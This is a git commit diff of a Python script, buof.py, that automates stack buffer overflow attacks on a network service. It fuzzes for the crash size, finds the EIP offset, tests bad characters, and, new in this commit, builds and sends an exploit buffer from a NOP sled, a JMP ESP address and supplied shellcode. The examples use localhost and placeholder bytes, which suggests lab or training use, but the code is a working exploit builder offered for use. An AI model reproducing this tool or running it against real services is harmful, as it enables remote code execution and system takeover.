9d5a0e723367a0b6a1826cd1f4ad186981f60ac3
Ankur Tyagi (@7h3rAm) <ankurt.20@gmail.com>
2020-07-29 18:33:21 +0530

    💫  final commit.

--- buof.py
+++ buof.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import re
 import sys
 import random
 import socket
@@ -9,6 +10,13 @@ from string import digits, ascii_uppercase, ascii_lowercase
 
 
 """
+  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
+  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 300 --eipvalue 2cA3
+  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 300 --badchars "\x00\x0a\x0d"
+  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 300 --offset 68 --jmpesp "\xca\xfe\xca\xfe" --header "GET " --trailer "\x0a\x0d" --shellcode "\xfe\xca\xfe\xca"
+  python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 300 --offset 68 --jmpesp "\xca\xfe\xca\xfe" --header "GET " --trailer "\x0a\x0d" --shellcode "fecafeca"
+
+
   a. fuzz and find buffer overflow size:
     python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
     python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 3000 --eipvalue pD5p
@@ -59,6 +67,15 @@ class BUOF:
     self.lhost = lhost
     self.lport = lport
 
+  def tobin(self, data):
+    data = data.strip()
+    if data.startswith("\\x"):
+      return list(binascii.unhexlify(data.replace("\\x", "")))
+    elif re.search(r"^[a-zA-Z0-9]+$", data):
+      return list(map(ord, data.upper()))
+    else:
+      return list(map(ord, data))
+
   def hexdump(self, src, length=16, sep='.'):
     # https://gist.github.com/7h3rAm/5603718
     FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
@@ -101,6 +118,7 @@ class BUOF:
     self._pcreate(10)
 
   def opcode_fuzz(self, bufsize):
+    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
     bufsize = 10 if not bufsize else bufsize
     while True:
       fuzbuf = self.pcreate(bufsize)
@@ -117,10 +135,10 @@ class BUOF:
       bufsize += 10
 
   def opcode_offset(self, bufsize, eipvalue):
+    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 3000 --eipvalue pD5p
     if not eipvalue:
       print("[-] need eipvalue to find offset within fuzbuf")
       return
-
     bufsize = 10 if not bufsize else bufsize
     maxbufsize = 10000
     while True:
@@ -138,19 +156,44 @@ class BUOF:
           continue
 
   def opcode_badchars(self, bufsize, badchars):
+    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00\x0a\x0d"
     if not bufsize:
       print("[-] need bufsize to find badchars")
       return
-
     ascii = list(map(ord, "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"))
-    badchars = list(binascii.unhexlify(badchars.replace("\\x", ""))) if badchars else []
+    badchars = self.tobin(badchars) if badchars else []
     stripped = [x for x in ascii if x not in badchars]
     buf = []
-    buf.extend(list(map(ord, "\x90"*16)))
+    nops = self.tobin("\x90"*32)
+    buf.extend(nops)
     buf.extend(stripped)
-    buf.extend(list(map(ord, "\x90"*16)))
+    buf.extend(self.tobin("\x90"*(bufsize-len(buf))))
     self.sendrecv(buf)
 
+  def opcode_exploit(self, bufsize, offset, jmpesp, shellcode, header="", trailer=""):
+    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 3000 --offset 2805 --jmpesp "\xca\xfe\xca\xfe"
+    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 3000 --offset 2805 --jmpesp "\xca\xfe\xca\xfe" --header "GET " --trailer "\x0a\x0d"
+    if not bufsize or not offset or not jmpesp:
+      print("[+] need bufsize, offset and jmpesp to exploit")
+      return
+    header = self.tobin(header)
+    nopindexer = self.tobin("\x90"*(offset-len(header)))
+    jmpesp = self.tobin(jmpesp)
+    nopspacer = self.tobin("\x90"*16)
+    shellcode = self.tobin(shellcode)
+    trailer = self.tobin(trailer)
+
+    ## fuzbuf = header + nopindexer + jmpsesp + nopspacer + shellcode + noppadding + trailer
+    fuzbuf = []
+    fuzbuf += header
+    fuzbuf += nopindexer
+    fuzbuf += jmpesp
+    fuzbuf += nopspacer
+    fuzbuf += shellcode
+    fuzbuf += list(map(ord, "\x90"*(bufsize-len(fuzbuf)-len(trailer))))
+    fuzbuf += trailer
+
+    self.sendrecv(fuzbuf)
 
 def main(args):
   buof = BUOF(rhost=args.rhost, rport=args.rport, lhost=args.lhost, lport=args.lport)
@@ -158,17 +201,22 @@ def main(args):
   # bufsize is optional here, will fuzz till crash if not provided, else will start fuzz from bufsize
   # will give us actual bufsize (in multiples of 10) and eipvalue (from debugger exception)
   if args.opcode == "fuzz":
-    buof.opcode_fuzz(args.bufsize)
+    buof.opcode_fuzz(bufsize=args.bufsize)
 
   # bufsize is optional here, will fuzz found or maxbufsize (10000)
   # will give us eip offset within fuzbuf
   elif args.opcode == "offset":
-    buof.opcode_offset(args.bufsize, args.eipvalue)
+    buof.opcode_offset(bufsize=args.bufsize, eipvalue=args.eipvalue)
 
   # bufsize is required here
   # badchars is optional, will strip those from fuzbuf, if provided
   elif args.opcode == "badchars":
-    buof.opcode_badchars(args.bufsize, args.badchars)
+    buof.opcode_badchars(bufsize=args.bufsize, badchars=args.badchars)
+
+  # bufsize, offset, jmpesp and shellcode are required here
+  # header and trailer are optional
+  elif args.opcode == "exploit":
+    buof.opcode_exploit(bufsize=args.bufsize, offset=args.offset, jmpesp=args.jmpesp, shellcode=args.shellcode, header=args.header, trailer=args.trailer)
 
 
 if __name__ == "__main__":
@@ -184,7 +232,11 @@ if __name__ == "__main__":
   # optional args
   parser.add_argument('--bufsize', required=False, default=0, type=int, action='store')
   parser.add_argument('--eipvalue', required=False, default=None, action='store')
-  parser.add_argument('--offset', required=False, default=0, action='store')
+  parser.add_argument('--offset', required=False, default=0, type=int, action='store')
   parser.add_argument('--badchars', required=False, default=None, action='store')
+  parser.add_argument('--jmpesp', required=False, default=None, action='store')
+  parser.add_argument('--shellcode', required=False, default=None, action='store')
+  parser.add_argument('--header', required=False, default="", action='store')
+  parser.add_argument('--trailer', required=False, default="", action='store')
 
   main(parser.parse_args())
